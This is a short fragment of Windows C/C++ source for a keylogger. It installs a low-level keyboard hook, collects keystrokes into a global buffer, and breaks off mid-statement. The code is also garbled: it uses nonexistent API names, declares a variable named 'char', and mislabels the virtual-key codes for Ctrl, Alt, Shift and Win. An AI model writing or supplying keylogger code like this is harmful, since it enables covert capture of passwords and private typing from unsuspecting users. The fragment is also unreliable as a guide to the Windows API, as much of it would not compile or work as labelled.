### Code:

```c
#include <Windows.h>
#include <iostream>
#include <ctime>
#include <vector>
#include <string>

using namespace std;

#define MAX_KEYSTROKES 100  // Maximum number of keystrokes to store

HHOOK keyboardHook = NULL;

// Function prototypes
void CALLBACK keyboardEvent(HWND hwnd, int event, UINT uParam, int key, int state);
void initializeKeyboardHook();
void releaseKeyboardHook();

// Global variable to store keystrokes
vector<string> keystrokes(MAX_KEYSTROKES);
int currentTimestamp = 0;

// Initialize the hook
void initializeKeyboardHook() {
    keyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardEvent);
    if (!keyboardHook) {
        cout << "Failed to install keyboard hook." << endl;
        return;
    }
}

// Handle keyboard events
void CALLBACK keyboardEvent(HWND hwnd, int event, UINT uParam, int key, int state) {
    if (!keyboardHook) return;

    KBDLLHOOK keyInfo;
    keyInfo.length = sizeof(KBDLLHOOK);
    keyInfo.key = key;

    if (state == 0) {  // Key is being pressed down
        if (GetKeyState(0x1) & 0x2) {  // Check if Ctrl is pressed
            return;
        }
        if (GetKeyState(0x10) & 0x2) {  // Check if Alt is pressed
            return;
        }
        if (GetKeyState(0x20) & 0x2) {  // Check if Shift is pressed
            return;
        }
        if (GetKeyState(0x40) & 0x2) {  // Check if Win is pressed
            return;
        }

        // Get the character for the key
        char char = GetChar(key);
        if (char > 0) {
